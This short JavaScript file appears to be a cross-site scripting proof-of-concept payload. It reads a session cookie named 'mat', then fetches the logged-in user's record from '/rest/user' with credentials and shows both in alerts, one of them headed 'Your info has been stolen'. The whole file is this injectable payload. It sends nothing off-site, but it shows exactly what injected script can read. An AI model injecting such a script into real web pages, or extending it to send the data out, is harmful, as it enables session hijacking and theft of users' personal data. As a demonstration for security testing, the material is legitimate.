const matCookie = document.cookie
    .split('; ')
    .find(row => row.startsWith('mat='))
    ?.split('=')[1];

if (matCookie) {
    alert(decodeURIComponent(matCookie));
} else {
    alert('Session not found, are you logged in ?');
}
fetch('/rest/user', {
    credentials: 'include'
})
.then(response => {
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
})
.then(data => {
    const formattedResponse = JSON.stringify(data, null, 2);
    alert(`Your info has been stolen:\n\n${formattedResponse}`);
})
.catch(error => {
    alert(`Error fetching /rest/user, are you logged in?`);
});
